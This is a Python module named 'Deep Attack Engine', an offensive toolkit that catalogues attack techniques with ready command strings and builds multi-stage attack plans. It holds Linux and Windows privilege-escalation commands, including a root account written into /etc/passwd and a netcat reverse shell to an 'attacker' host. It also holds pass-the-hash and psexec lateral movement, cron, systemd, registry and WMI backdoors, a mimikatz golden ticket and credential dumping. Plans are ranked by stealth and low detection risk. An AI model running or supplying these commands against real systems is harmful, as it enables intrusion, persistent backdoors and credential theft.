"""
Deep Attack Engine v2.0 - 深度攻击引擎

升级内容:
1. 多阶段智能攻击链
2. 自适应漏洞利用策略
3. 权限提升自动化
4. 横向移动编排
5. 持久化技术库
6. 数据外泄策略

Author: SeaOf0
Version: 2.0.0
"""

import asyncio
import json
import time
from typing import Dict, List, Any, Optional, Callable, Tuple
from dataclasses import dataclass, field
from enum import Enum
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import logging

logger = logging.getLogger(__name__)


# ==================== 攻击阶段枚举 ====================

class AttackPhase(Enum):
    """攻击阶段 - 基于MITRE ATT&CK框架"""
    RECONNAISSANCE = "reconnaissance"          # 侦察
    RESOURCE_DEVELOPMENT = "resource_dev"      # 资源开发
    INITIAL_ACCESS = "initial_access"          # 初始访问
    EXECUTION = "execution"                    # 执行
    PERSISTENCE = "persistence"                # 持久化
    PRIVILEGE_ESCALATION = "priv_esc"          # 权限提升
    DEFENSE_EVASION = "defense_evasion"        # 防御规避
    CREDENTIAL_ACCESS = "cred_access"          # 凭据访问
    DISCOVERY = "discovery"                    # 发现
    LATERAL_MOVEMENT = "lateral_move"          # 横向移动
    COLLECTION = "collection"                  # 数据收集
    EXFILTRATION = "exfiltration"              # 数据外泄
    IMPACT = "impact"                          # 影响


class ExploitDifficulty(Enum):
    """利用难度"""
    TRIVIAL = "trivial"      # 极简单
    EASY = "easy"            # 简单
    MEDIUM = "medium"        # 中等
    HARD = "hard"            # 困难
    EXPERT = "expert"        # 专家级


class TargetOS(Enum):
    """目标操作系统"""
    LINUX = "linux"
    WINDOWS = "windows"
    MACOS = "macos"
    UNIX = "unix"
    UNKNOWN = "unknown"


# ==================== 数据结构 ====================

@dataclass
class ExploitTechnique:
    """漏洞利用技术"""
    name: str
    mitre_id: str
    description: str
    phase: AttackPhase
    difficulty: ExploitDifficulty
    target_os: List[TargetOS]
    prerequisites: List[str]
    commands: List[str]
    indicators: List[str]
    success_rate: float = 0.7
    detection_risk: float = 0.3


@dataclass
class PrivilegeEscalation:
    """权限提升技术"""
    name: str
    target_os: TargetOS
    from_privilege: str  # user, service, etc.
    to_privilege: str    # root, SYSTEM, etc.
    technique: str
    commands: List[str]
    check_commands: List[str]
    success_indicators: List[str]
    difficulty: ExploitDifficulty


@dataclass
class LateralMoveTechnique:
    """横向移动技术"""
    name: str
    protocol: str  # smb, ssh, wmi, rdp, etc.
    required_credentials: str  # password, hash, ticket
    commands: List[str]
    target_os: TargetOS
    detection_risk: float


@dataclass
class PersistenceTechnique:
    """持久化技术"""
    name: str
    mitre_id: str
    target_os: TargetOS
    method: str
    install_commands: List[str]
    verify_commands: List[str]
    remove_commands: List[str]
    stealth_level: int  # 1-10


@dataclass
class AttackChainResult:
    """攻击链执行结果"""
    chain_name: str
    start_time: datetime
    end_time: Optional[datetime]
    phases_completed: List[str]
    vulnerabilities_found: List[Dict]
    exploits_succeeded: List[str]
    credentials_obtained: List[Dict]
    flags_found: List[str]
    pivot_points: List[str]
    success: bool
    error: Optional[str]


# ==================== 权限提升技术库 ====================

LINUX_PRIVESC_TECHNIQUES = [
    PrivilegeEscalation(
        name="SUID Binary Exploitation",
        target_os=TargetOS.LINUX,
        from_privilege="user",
        to_privilege="root",
        technique="suid_binary",
        commands=[
            "find / -perm -4000 -type f 2>/dev/null",
            "find / -perm -u=s -type f 2>/dev/null",
        ],
        check_commands=["id", "whoami"],
        success_indicators=["uid=0", "root"],
        difficulty=ExploitDifficulty.EASY
    ),
    PrivilegeEscalation(
        name="Sudo Misconfiguration",
        target_os=TargetOS.LINUX,
        from_privilege="user",
        to_privilege="root",
        technique="sudo_misconfig",
        commands=[
            "sudo -l",
            "sudo -u root /bin/bash",
            "sudo vim -c ':!/bin/sh'",
            "sudo find . -exec /bin/sh \\; -quit",
            "sudo awk 'BEGIN {system(\"/bin/sh\")}'",
        ],
        check_commands=["sudo -l"],
        success_indicators=["NOPASSWD", "(ALL)", "root"],
        difficulty=ExploitDifficulty.EASY
    ),
    PrivilegeEscalation(
        name="Kernel Exploit",
        target_os=TargetOS.LINUX,
        from_privilege="user",
        to_privilege="root",
        technique="kernel_exploit",
        commands=[
            "uname -a",
            "cat /proc/version",
            "searchsploit linux kernel",
        ],
        check_commands=["uname -r"],
        success_indicators=["CVE", "exploit"],
        difficulty=ExploitDifficulty.MEDIUM
    ),
    PrivilegeEscalation(
        name="Cron Job Hijacking",
        target_os=TargetOS.LINUX,
        from_privilege="user",
        to_privilege="root",
        technique="cron_hijack",
        commands=[
            "cat /etc/crontab",
            "ls -la /etc/cron.*",
            "crontab -l",
            "find / -writable -name '*.sh' 2>/dev/null",
        ],
        check_commands=["cat /etc/crontab"],
        success_indicators=["* * * *", "root"],
        difficulty=ExploitDifficulty.MEDIUM
    ),
    PrivilegeEscalation(
        name="Writable /etc/passwd",
        target_os=TargetOS.LINUX,
        from_privilege="user",
        to_privilege="root",
        technique="passwd_write",
        commands=[
            "ls -la /etc/passwd",
            "echo 'hacker:$(openssl passwd -1 password):0:0::/root:/bin/bash' >> /etc/passwd",
        ],
        check_commands=["ls -la /etc/passwd"],
        success_indicators=["-rw-rw"],
        difficulty=ExploitDifficulty.TRIVIAL
    ),
    PrivilegeEscalation(
        name="Capabilities Abuse",
        target_os=TargetOS.LINUX,
        from_privilege="user",
        to_privilege="root",
        technique="capabilities",
        commands=[
            "getcap -r / 2>/dev/null",
            "/usr/bin/python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
        ],
        check_commands=["getcap -r / 2>/dev/null"],
        success_indicators=["cap_setuid", "cap_setgid"],
        difficulty=ExploitDifficulty.MEDIUM
    ),
    PrivilegeEscalation(
        name="Docker Escape",
        target_os=TargetOS.LINUX,
        from_privilege="container",
        to_privilege="host_root",
        technique="docker_escape",
        commands=[
            "cat /proc/1/cgroup | grep docker",
            "docker run -v /:/host -it alpine chroot /host",
            "nsenter --target 1 --mount --uts --ipc --net --pid",
        ],
        check_commands=["id", "hostname"],
        success_indicators=["docker", "container"],
        difficulty=ExploitDifficulty.HARD
    ),
    PrivilegeEscalation(
        name="NFS Root Squashing Bypass",
        target_os=TargetOS.LINUX,
        from_privilege="user",
        to_privilege="root",
        technique="nfs_nosquash",
        commands=[
            "cat /etc/exports",
            "showmount -e target",
            "mount -o rw,vers=2 target:/share /mnt",
        ],
        check_commands=["cat /etc/exports"],
        success_indicators=["no_root_squash"],
        difficulty=ExploitDifficulty.MEDIUM
    ),
]

WINDOWS_PRIVESC_TECHNIQUES = [
    PrivilegeEscalation(
        name="Unquoted Service Path",
        target_os=TargetOS.WINDOWS,
        from_privilege="user",
        to_privilege="SYSTEM",
        technique="unquoted_service",
        commands=[
            "wmic service get name,displayname,pathname,startmode | findstr /i /v \"C:\\Windows\\\" | findstr /i /v \"\"\"",
            "sc qc ServiceName",
        ],
        check_commands=["wmic service get pathname"],
        success_indicators=["Program Files", "without quotes"],
        difficulty=ExploitDifficulty.EASY
    ),
    PrivilegeEscalation(
        name="Always Install Elevated",
        target_os=TargetOS.WINDOWS,
        from_privilege="user",
        to_privilege="SYSTEM",
        technique="always_install_elevated",
        commands=[
            "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
            "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
            "msiexec /quiet /qn /i malicious.msi",
        ],
        check_commands=["reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer"],
        success_indicators=["0x1"],
        difficulty=ExploitDifficulty.EASY
    ),
    PrivilegeEscalation(
        name="Token Impersonation",
        target_os=TargetOS.WINDOWS,
        from_privilege="service",
        to_privilege="SYSTEM",
        technique="token_impersonation",
        commands=[
            "whoami /priv",
            "incognito.exe list_tokens -u",
            "incognito.exe execute -c \"NT AUTHORITY\\SYSTEM\" cmd.exe",
        ],
        check_commands=["whoami /priv"],
        success_indicators=["SeImpersonatePrivilege", "SeAssignPrimaryTokenPrivilege"],
        difficulty=ExploitDifficulty.MEDIUM
    ),
    PrivilegeEscalation(
        name="JuicyPotato",
        target_os=TargetOS.WINDOWS,
        from_privilege="service",
        to_privilege="SYSTEM",
        technique="juicy_potato",
        commands=[
            "whoami /priv",
            "JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -t * -c {CLSID}",
        ],
        check_commands=["whoami /priv"],
        success_indicators=["SeImpersonatePrivilege"],
        difficulty=ExploitDifficulty.MEDIUM
    ),
    PrivilegeEscalation(
        name="PrintSpoofer",
        target_os=TargetOS.WINDOWS,
        from_privilege="service",
        to_privilege="SYSTEM",
        technique="print_spoofer",
        commands=[
            "PrintSpoofer64.exe -i -c cmd",
            "PrintSpoofer64.exe -c \"nc.exe attacker 443 -e cmd\"",
        ],
        check_commands=["whoami /priv"],
        success_indicators=["SeImpersonatePrivilege"],
        difficulty=ExploitDifficulty.EASY
    ),
    PrivilegeEscalation(
        name="DLL Hijacking",
        target_os=TargetOS.WINDOWS,
        from_privilege="user",
        to_privilege="SYSTEM",
        technique="dll_hijack",
        commands=[
            "procmon.exe",  # Monitor for missing DLLs
            "icacls C:\\PathToService",
            "copy malicious.dll C:\\PathToService\\missing.dll",
        ],
        check_commands=["icacls"],
        success_indicators=["BUILTIN\\Users:(F)", "Everyone:(F)"],
        difficulty=ExploitDifficulty.MEDIUM
    ),
    PrivilegeEscalation(
        name="Scheduled Task Abuse",
        target_os=TargetOS.WINDOWS,
        from_privilege="user",
        to_privilege="SYSTEM",
        technique="schtask_abuse",
        commands=[
            "schtasks /query /fo LIST /v",
            "icacls C:\\TaskPath\\script.bat",
        ],
        check_commands=["schtasks /query"],
        success_indicators=["NT AUTHORITY\\SYSTEM", "writable"],
        difficulty=ExploitDifficulty.MEDIUM
    ),
]


# ==================== 横向移动技术库 ====================

LATERAL_MOVEMENT_TECHNIQUES = [
    LateralMoveTechnique(
        name="PSExec",
        protocol="smb",
        required_credentials="password_or_hash",
        commands=[
            "psexec.py domain/user:password@target",
            "psexec.py -hashes :NTLM_HASH domain/user@target",
            "impacket-psexec domain/user:password@target",
        ],
        target_os=TargetOS.WINDOWS,
        detection_risk=0.7
    ),
    LateralMoveTechnique(
        name="WMIExec",
        protocol="wmi",
        required_credentials="password_or_hash",
        commands=[
            "wmiexec.py domain/user:password@target",
            "wmiexec.py -hashes :NTLM_HASH domain/user@target",
        ],
        target_os=TargetOS.WINDOWS,
        detection_risk=0.5
    ),
    LateralMoveTechnique(
        name="SMBExec",
        protocol="smb",
        required_credentials="password_or_hash",
        commands=[
            "smbexec.py domain/user:password@target",
            "smbexec.py -hashes :NTLM_HASH domain/user@target",
        ],
        target_os=TargetOS.WINDOWS,
        detection_risk=0.6
    ),
    LateralMoveTechnique(
        name="Evil-WinRM",
        protocol="winrm",
        required_credentials="password_or_hash",
        commands=[
            "evil-winrm -i target -u user -p password",
            "evil-winrm -i target -u user -H NTLM_HASH",
        ],
        target_os=TargetOS.WINDOWS,
        detection_risk=0.4
    ),
    LateralMoveTechnique(
        name="SSH Key",
        protocol="ssh",
        required_credentials="private_key",
        commands=[
            "ssh -i id_rsa user@target",
            "ssh -o StrictHostKeyChecking=no user@target",
        ],
        target_os=TargetOS.LINUX,
        detection_risk=0.2
    ),
    LateralMoveTechnique(
        name="Pass-the-Hash",
        protocol="smb",
        required_credentials="ntlm_hash",
        commands=[
            "pth-winexe -U domain/user%hash //target cmd",
            "crackmapexec smb target -u user -H hash -x 'command'",
        ],
        target_os=TargetOS.WINDOWS,
        detection_risk=0.6
    ),
    LateralMoveTechnique(
        name="Pass-the-Ticket",
        protocol="kerberos",
        required_credentials="kerberos_ticket",
        commands=[
            "export KRB5CCNAME=/path/to/ticket.ccache",
            "psexec.py -k -no-pass domain/user@target",
        ],
        target_os=TargetOS.WINDOWS,
        detection_risk=0.4
    ),
    LateralMoveTechnique(
        name="DCOM Execution",
        protocol="dcom",
        required_credentials="password_or_hash",
        commands=[
            "dcomexec.py domain/user:password@target",
            "dcomexec.py -hashes :NTLM_HASH domain/user@target",
        ],
        target_os=TargetOS.WINDOWS,
        detection_risk=0.5
    ),
    LateralMoveTechnique(
        name="RDP Hijacking",
        protocol="rdp",
        required_credentials="local_admin",
        commands=[
            "query user",
            "tscon SESSION_ID /dest:rdp-tcp#0",
        ],
        target_os=TargetOS.WINDOWS,
        detection_risk=0.3
    ),
]


# ==================== 持久化技术库 ====================

PERSISTENCE_TECHNIQUES = [
    PersistenceTechnique(
        name="Cron Job",
        mitre_id="T1053.003",
        target_os=TargetOS.LINUX,
        method="cron",
        install_commands=[
            "(crontab -l; echo '*/5 * * * * /tmp/backdoor.sh') | crontab -",
            "echo '*/5 * * * * root /tmp/backdoor.sh' >> /etc/crontab",
        ],
        verify_commands=["crontab -l", "cat /etc/crontab"],
        remove_commands=["crontab -r"],
        stealth_level=5
    ),
    PersistenceTechnique(
        name="SSH Authorized Keys",
        mitre_id="T1098.004",
        target_os=TargetOS.LINUX,
        method="ssh_key",
        install_commands=[
            "echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys",
            "chmod 600 ~/.ssh/authorized_keys",
        ],
        verify_commands=["cat ~/.ssh/authorized_keys"],
        remove_commands=["rm ~/.ssh/authorized_keys"],
        stealth_level=7
    ),
    PersistenceTechnique(
        name="Systemd Service",
        mitre_id="T1543.002",
        target_os=TargetOS.LINUX,
        method="systemd",
        install_commands=[
            "cat > /etc/systemd/system/backdoor.service << EOF\n[Unit]\nDescription=Backdoor\n[Service]\nExecStart=/tmp/backdoor\nRestart=always\n[Install]\nWantedBy=multi-user.target\nEOF",
            "systemctl enable backdoor.service",
            "systemctl start backdoor.service",
        ],
        verify_commands=["systemctl status backdoor.service"],
        remove_commands=["systemctl disable backdoor.service", "rm /etc/systemd/system/backdoor.service"],
        stealth_level=4
    ),
    PersistenceTechnique(
        name="Bashrc Modification",
        mitre_id="T1546.004",
        target_os=TargetOS.LINUX,
        method="bashrc",
        install_commands=[
            "echo '/tmp/backdoor &' >> ~/.bashrc",
            "echo 'alias sudo=\"/tmp/sudo-wrapper.sh\"' >> ~/.bashrc",
        ],
        verify_commands=["cat ~/.bashrc"],
        remove_commands=["sed -i '/backdoor/d' ~/.bashrc"],
        stealth_level=6
    ),
    PersistenceTechnique(
        name="Registry Run Key",
        mitre_id="T1547.001",
        target_os=TargetOS.WINDOWS,
        method="registry_run",
        install_commands=[
            "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d C:\\backdoor.exe",
            "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d C:\\backdoor.exe",
        ],
        verify_commands=["reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"],
        remove_commands=["reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /f"],
        stealth_level=4
    ),
    PersistenceTechnique(
        name="Scheduled Task",
        mitre_id="T1053.005",
        target_os=TargetOS.WINDOWS,
        method="schtask",
        install_commands=[
            "schtasks /create /sc minute /mo 5 /tn Backdoor /tr C:\\backdoor.exe",
            "schtasks /create /sc onlogon /tn Backdoor /tr C:\\backdoor.exe",
        ],
        verify_commands=["schtasks /query /tn Backdoor"],
        remove_commands=["schtasks /delete /tn Backdoor /f"],
        stealth_level=5
    ),
    PersistenceTechnique(
        name="Windows Service",
        mitre_id="T1543.003",
        target_os=TargetOS.WINDOWS,
        method="service",
        install_commands=[
            "sc create Backdoor binPath= C:\\backdoor.exe start= auto",
            "sc start Backdoor",
        ],
        verify_commands=["sc query Backdoor"],
        remove_commands=["sc stop Backdoor", "sc delete Backdoor"],
        stealth_level=4
    ),
    PersistenceTechnique(
        name="WMI Event Subscription",
        mitre_id="T1546.003",
        target_os=TargetOS.WINDOWS,
        method="wmi_subscription",
        install_commands=[
            '''wmic /NAMESPACE:"\\root\\subscription" PATH __EventFilter CREATE Name="Backdoor", EventNameSpace="root\\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"''',
        ],
        verify_commands=["wmic /NAMESPACE:\\\\root\\subscription PATH __EventFilter GET Name"],
        remove_commands=["wmic /NAMESPACE:\\\\root\\subscription PATH __EventFilter WHERE Name='Backdoor' DELETE"],
        stealth_level=8
    ),
    PersistenceTechnique(
        name="Golden Ticket",
        mitre_id="T1558.001",
        target_os=TargetOS.WINDOWS,
        method="golden_ticket",
        install_commands=[
            "mimikatz.exe 'kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:HASH /ptt'",
        ],
        verify_commands=["klist"],
        remove_commands=["klist purge"],
        stealth_level=9
    ),
]


# ==================== 深度攻击引擎 ====================

class DeepAttackEngine:
    """深度攻击引擎 - 管理多阶段攻击"""

    def __init__(self):
        self.linux_privesc = LINUX_PRIVESC_TECHNIQUES
        self.windows_privesc = WINDOWS_PRIVESC_TECHNIQUES
        self.lateral_techniques = LATERAL_MOVEMENT_TECHNIQUES
        self.persistence_techniques = PERSISTENCE_TECHNIQUES

        self.current_phase = AttackPhase.RECONNAISSANCE
        self.attack_history: List[Dict] = []
        self.discovered_credentials: List[Dict] = []
        self.pivot_points: List[str] = []
        self.flags: List[str] = []

    def get_privesc_techniques(self, target_os: TargetOS, difficulty_max: ExploitDifficulty = None) -> List[PrivilegeEscalation]:
        """获取权限提升技术"""
        if target_os == TargetOS.LINUX:
            techniques = self.linux_privesc
        elif target_os == TargetOS.WINDOWS:
            techniques = self.windows_privesc
        else:
            return []

        if difficulty_max:
            difficulty_order = [
                ExploitDifficulty.TRIVIAL,
                ExploitDifficulty.EASY,
                ExploitDifficulty.MEDIUM,
                ExploitDifficulty.HARD,
                ExploitDifficulty.EXPERT
            ]
            max_idx = difficulty_order.index(difficulty_max)
            techniques = [t for t in techniques if difficulty_order.index(t.difficulty) <= max_idx]

        return techniques

    def get_lateral_techniques(self, protocol: str = None, target_os: TargetOS = None) -> List[LateralMoveTechnique]:
        """获取横向移动技术"""
        techniques = self.lateral_techniques

        if protocol:
            techniques = [t for t in techniques if t.protocol == protocol]

        if target_os:
            techniques = [t for t in techniques if t.target_os == target_os]

        # 按检测风险排序
        return sorted(techniques, key=lambda x: x.detection_risk)

    def get_persistence_techniques(self, target_os: TargetOS, stealth_min: int = 0) -> List[PersistenceTechnique]:
        """获取持久化技术"""
        techniques = [t for t in self.persistence_techniques if t.target_os == target_os]

        if stealth_min > 0:
            techniques = [t for t in techniques if t.stealth_level >= stealth_min]

        return sorted(techniques, key=lambda x: x.stealth_level, reverse=True)

    def suggest_next_phase(self, current_phase: AttackPhase, context: Dict[str, Any]) -> Tuple[AttackPhase, List[str]]:
        """建议下一攻击阶段"""
        phase_order = [
            AttackPhase.RECONNAISSANCE,
            AttackPhase.INITIAL_ACCESS,
            AttackPhase.EXECUTION,
            AttackPhase.PRIVILEGE_ESCALATION,
            AttackPhase.PERSISTENCE,
            AttackPhase.CREDENTIAL_ACCESS,
            AttackPhase.DISCOVERY,
            AttackPhase.LATERAL_MOVEMENT,
            AttackPhase.COLLECTION,
            AttackPhase.EXFILTRATION,
        ]

        current_idx = phase_order.index(current_phase)

        # 基于上下文决定下一阶段
        has_shell = context.get("has_shell", False)
        is_root = context.get("is_root", False)
        has_credentials = context.get("has_credentials", False)
        network_access = context.get("network_access", False)

        suggestions = []

        if not has_shell:
            return AttackPhase.INITIAL_ACCESS, ["需要先获取shell访问"]

        if has_shell and not is_root:
            return AttackPhase.PRIVILEGE_ESCALATION, ["当前为普通用户，建议提权"]

        if is_root and not has_credentials:
            return AttackPhase.CREDENTIAL_ACCESS, ["已获root权限，建议提取凭据"]

        if has_credentials and network_access:
            return AttackPhase.LATERAL_MOVEMENT, ["有凭据且可访问网络，建议横向移动"]

        # 默认进入下一阶段
        if current_idx < len(phase_order) - 1:
            return phase_order[current_idx + 1], ["继续下一攻击阶段"]

        return AttackPhase.EXFILTRATION, ["攻击链已完成，建议数据外泄"]

    def generate_attack_plan(self, target_info: Dict[str, Any]) -> Dict[str, Any]:
        """生成完整攻击计划"""
        target_os = TargetOS(target_info.get("os", "unknown"))
        services = target_info.get("services", [])
        entry_points = target_info.get("entry_points", [])

        plan = {
            "target": target_info.get("target"),
            "phases": [],
            "estimated_time": 0,
            "difficulty": ExploitDifficulty.MEDIUM.value,
        }

        # Phase 1: Initial Access
        initial_techniques = []
        if "http" in services or "https" in services:
            initial_techniques.append({
                "name": "Web Application Exploitation",
                "tools": ["nuclei_scan", "sqlmap_scan", "gobuster_scan"],
                "priority": 1
            })
        if "ssh" in services:
            initial_techniques.append({
                "name": "SSH Brute Force",
                "tools": ["hydra_attack"],
                "priority": 3
            })
        if "smb" in services:
            initial_techniques.append({
                "name": "SMB Exploitation",
                "tools": ["enum4linux_scan", "metasploit_run"],
                "priority": 2
            })

        plan["phases"].append({
            "phase": AttackPhase.INITIAL_ACCESS.value,
            "techniques": initial_techniques,
            "objective": "获取初始访问权限"
        })

        # Phase 2: Privilege Escalation
        privesc_techniques = self.get_privesc_techniques(target_os, ExploitDifficulty.MEDIUM)
        plan["phases"].append({
            "phase": AttackPhase.PRIVILEGE_ESCALATION.value,
            "techniques": [
                {
                    "name": t.name,
                    "commands": t.commands[:2],
                    "difficulty": t.difficulty.value
                }
                for t in privesc_techniques[:5]
            ],
            "objective": "提升至最高权限"
        })

        # Phase 3: Persistence
        persist_techniques = self.get_persistence_techniques(target_os, stealth_min=5)
        plan["phases"].append({
            "phase": AttackPhase.PERSISTENCE.value,
            "techniques": [
                {
                    "name": t.name,
                    "commands": t.install_commands[:1],
                    "stealth": t.stealth_level
                }
                for t in persist_techniques[:3]
            ],
            "objective": "建立持久化访问"
        })

        # Phase 4: Credential Access
        plan["phases"].append({
            "phase": AttackPhase.CREDENTIAL_ACCESS.value,
            "techniques": [
                {
                    "name": "Credential Dumping",
                    "commands": [
                        "cat /etc/shadow" if target_os == TargetOS.LINUX else "mimikatz sekurlsa::logonpasswords",
                        "find / -name '*.conf' -exec grep -l password {} \\;" if target_os == TargetOS.LINUX else "reg query HKLM /f password /t REG_SZ /s"
                    ],
                    "priority": 1
                }
            ],
            "objective": "获取凭据"
        })

        # Phase 5: Lateral Movement (if applicable)
        if target_info.get("is_internal", False):
            lateral_techniques = self.get_lateral_techniques(target_os=target_os)
            plan["phases"].append({
                "phase": AttackPhase.LATERAL_MOVEMENT.value,
                "techniques": [
                    {
                        "name": t.name,
                        "protocol": t.protocol,
                        "commands": t.commands[:1],
                        "risk": t.detection_risk
                    }
                    for t in lateral_techniques[:3]
                ],
                "objective": "横向移动到其他主机"
            })

        return plan

    def log_attack_step(self, phase: AttackPhase, technique: str, success: bool, details: Dict = None):
        """记录攻击步骤"""
        self.attack_history.append({
            "timestamp": datetime.now().isoformat(),
            "phase": phase.value,
            "technique": technique,
            "success": success,
            "details": details or {}
        })

    def add_credential(self, cred_type: str, username: str, credential: str, source: str):
        """添加发现的凭据"""
        self.discovered_credentials.append({
            "type": cred_type,  # password, hash, key, ticket
            "username": username,
            "credential": credential,
            "source": source,
            "discovered_at": datetime.now().isoformat()
        })

    def add_pivot_point(self, target: str, access_method: str):
        """添加跳板点"""
        self.pivot_points.append({
            "target": target,
            "access_method": access_method,
            "discovered_at": datetime.now().isoformat()
        })

    def add_flag(self, flag: str, source: str):
        """添加发现的Flag"""
        if flag not in self.flags:
            self.flags.append(flag)

    def get_attack_summary(self) -> Dict[str, Any]:
        """获取攻击摘要"""
        return {
            "current_phase": self.current_phase.value,
            "steps_executed": len(self.attack_history),
            "successful_steps": len([s for s in self.attack_history if s["success"]]),
            "credentials_found": len(self.discovered_credentials),
            "pivot_points": len(self.pivot_points),
            "flags_found": self.flags,
            "history": self.attack_history[-10:],  # 最近10步
        }


# ==================== 全局实例 ====================

_deep_attack_engine: Optional[DeepAttackEngine] = None


def get_deep_attack_engine() -> DeepAttackEngine:
    """获取深度攻击引擎单例"""
    global _deep_attack_engine
    if _deep_attack_engine is None:
        _deep_attack_engine = DeepAttackEngine()
    return _deep_attack_engine


# ==================== 便捷函数 ====================

def get_privesc(os_type: str, max_difficulty: str = None) -> List[Dict]:
    """获取权限提升技术"""
    engine = get_deep_attack_engine()
    target_os = TargetOS(os_type.lower())
    difficulty = ExploitDifficulty(max_difficulty) if max_difficulty else None
    techniques = engine.get_privesc_techniques(target_os, difficulty)
    return [
        {
            "name": t.name,
            "technique": t.technique,
            "commands": t.commands,
            "difficulty": t.difficulty.value
        }
        for t in techniques
    ]


def get_lateral(protocol: str = None, os_type: str = None) -> List[Dict]:
    """获取横向移动技术"""
    engine = get_deep_attack_engine()
    target_os = TargetOS(os_type.lower()) if os_type else None
    techniques = engine.get_lateral_techniques(protocol, target_os)
    return [
        {
            "name": t.name,
            "protocol": t.protocol,
            "commands": t.commands,
            "detection_risk": t.detection_risk
        }
        for t in techniques
    ]


def get_persistence(os_type: str, min_stealth: int = 0) -> List[Dict]:
    """获取持久化技术"""
    engine = get_deep_attack_engine()
    target_os = TargetOS(os_type.lower())
    techniques = engine.get_persistence_techniques(target_os, min_stealth)
    return [
        {
            "name": t.name,
            "mitre_id": t.mitre_id,
            "method": t.method,
            "install_commands": t.install_commands,
            "stealth_level": t.stealth_level
        }
        for t in techniques
    ]


def generate_plan(target_info: Dict) -> Dict:
    """生成攻击计划"""
    return get_deep_attack_engine().generate_attack_plan(target_info)


# ==================== 版本信息 ====================

__version__ = "2.0.0"
__description__ = "Deep Attack Engine with privilege escalation, lateral movement, and persistence techniques"
